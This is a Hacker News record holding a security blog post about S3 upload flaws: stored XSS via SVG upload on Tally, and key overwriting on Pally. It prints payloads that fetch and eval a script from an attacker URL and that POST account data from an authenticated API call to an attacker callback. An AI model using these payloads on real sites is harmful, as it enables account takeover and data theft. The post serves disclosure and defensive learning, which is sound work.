{"aid": "39989265", "title": "You Suck at Securing S3, Here's Why", "url": "https://env.fail/posts/aws-s3/", "domain": "env.fail", "votes": 3, "user": "xyzeva", "posted_at": "2024-04-10 10:55:46", "comments": 0, "source_title": "You Suck at Securing S3, Here's Why - env.fail", "source_text": "You Suck at Securing S3, Here's Why - env.fail\n\nenv.fail\n\n# You Suck at Securing S3, Here's Why\n\nby xyzeva\n\nTLDR: S3 presigned post or other ways of uploading files can easily be abused\nwith XSS or unwanted paths for uploads\n\nSo you might have recently seen all of my (Eva) tweets about S3 upload, and\nhow many companies can't stop messing it up. Believe it or not, this is a much\nmore widespread issue than even my tweets make it out to be.\n\nThis article covers two common vulnerabilities I've found with S3\nupload/presigned post.\n\n## Who doesn't love a good XSS?\n\nYou probably saw this one coming. Companies make a files.somecompany.com or\ncdn.somecompany.com subdomain for S3, and when combined with poor handling of\ncontent types on a upload endpoint, we can upload HTML files, and if their\ncookies are set inproperly, we could use this to takeover accounts.\n\n### Exhibit A: Tally\n\nTally is a modern Google Forms alternative which allows form creation with\nimages, for this reason (and also profile pictures), they need a way to store\nfiles.\n\nThey chose a custom-ish endpoint that uploads a file for you to their S3,\nafter performing checks. Sounds good, right?\n\nNot so fast, heres what the request for uploading something looks like:\n\nLooks interesting, what if we tried an HTML file instead?\n\n    \n    \n    <h1>Hello</h1> <img src=x onerror=\"alert(1)\"></img>\n\nNow lets try to upload it!\n\nLooks like it didn't work. Lets look at the DOM.\n\nHmm, it looks like Tally sanitized our XSS payload out, so they thought of\nthis. But its likely not foolproof. Lets try uploading a SVG/XML file instead.\n\n    \n    \n    <xml> <text> hello <img src=\"1\" onerror=\"fetch('ATTACKER_URL/script.js').then((a) => a.text().then((b) => eval(b)))\" xmlns=\"http://www.w3.org/1999/xhtml\" /> </text> </xml>\n\nThis, actually works. This allows me or a bad actor to get XSS on\nfiles.tally.so, which has the session cookie in scope, but its HTTP only. How\ncan we get the cookie when its http only?\n\nWell it turns out Tally has an endpoint for us that lets us get a\nauthentication token from a refresh cookie, as its web app also needs this\ntoken for the API, so this is intentional.\n\nHeres the final payload served by my webserver:\n\n    \n    \n    fetch(\"https://api.tally.so/me\", { credentials: \"include\" }).then((a) => a.json().then(async (b) => { await fetch(\"<ATTACKER_CALLBACK>\", { method: \"POST\", body: JSON.stringify(b), headers: { \"Content-Type\": \"application/json\", }, }); window.location.replace(\"https://tally.so\"); }) );\n\nAnd heres what my silly little webserver gets when someone clicks the link:\n\n    \n    \n    { \"id\": \"no :3\", \"firstName\": \"Eva\", \"lastName\": \"Ivy\", \"email\": \"xyzeva@riseup.net\", \"avatarUrl\": \"http://localhost\", \"fieldOfWork\": \"STUDENT\", \"organizationRole\": null, \"discoveredVia\": \"OTHER\", \"isBlocked\": false, \"isDeleted\": false, \"createdAt\": \"2024-02-24T09:26:03.000Z\", \"updatedAt\": \"2024-02-24T11:01:01.000Z\", \"organizationId\": \"no :3\", \"fullName\": \"Eva Ivy\", \"hasTwoFactorEnabled\": true, \"authorizationToken\": \"no :3\", \"isOrganizationOwner\": true, \"organizationOwner\": { \"id\": \"no :3\", \"firstName\": \"Eva\", \"lastName\": \"Ivy\", \"email\": \"xyzeva@riseup.net\", \"avatarUrl\": \"http://localhost\", \"fieldOfWork\": \"STUDENT\", \"organizationRole\": null, \"discoveredVia\": \"OTHER\", \"isBlocked\": false, \"isDeleted\": false, \"createdAt\": \"2024-02-24T09:26:03.000Z\", \"updatedAt\": \"2024-02-24T11:01:01.000Z\", \"organizationId\": \"no :3\", \"fullName\": \"Eva Ivy\", \"hasTwoFactorEnabled\": true }, \"hasActiveSubscription\": false, \"hasLifetimeAccess\": false, \"canAccessBilling\": false, \"hasAccess\": true, \"hasChurned\": false, \"excessUsage\": null }\n\nCool, one click full pwn of your tally account! Isn't that just really good?\n\nWhile no bounty was awarded for this, I can't blame them, theyre a startup and\nstill fixed the issue very quickly.\n\n## S3 paths are tasty\n\nSome services allow the user to control the path/key of the file to upload\nwhile uploading, common libraries also do this. This is a problem when the\nserver doesn't check if the file already exists, allowing the client to\noverride other peoples files.\n\n### Exhibit B: Pally\n\n...yes, I did choose this specific example to make it rhyme with Tally.\n\nAnyway, Pally is a way for streamers to setup a donation page and split it\nacross their team, such as their mods. They have channel banners & channel\nprofile pictures, so they need a way to store data.\n\nThey chose to use S3 to do this, here is what a request to upload a image\nlooks like:\n\nThis then returns a presigned post URL, the key is randomly generated by the\nclient, so what happens if I change the key into something thats already used\nby another user?\n\nWell, thats exactly what I did, and it worked. So for an entire minute, Thor\n(PirateSoftware)'s profile picture on Pally was a Gnome.\n\nThey also didn't offer a bounty for this, but they are also a smaller startup,\nso thats fair.\n\n## How 2 fix plz halp!!\n\nSimply avoid the examples above, set your cookies properly, don't allow people\nto control the key.\n\nIn conclusion, S3 is pretty hard to do, because of the common pitfalls people\ncome across while using third party libraries: Ignorance.\n\nThis is something we extensively covered in the past. And S3's lack of (good)\ndocs amplifies this issue.\n\n### That's too hard can't someone else do it for me?\n\nThere's many products available to simplify S3 (or redo!), heres a few:\n\n  * UploadThing by Ping\n  * ByteScale File Upload API by ByteScale\n  * FileStack\n\n\u00a9 2024 env.fail\n\n", "frontpage": false}
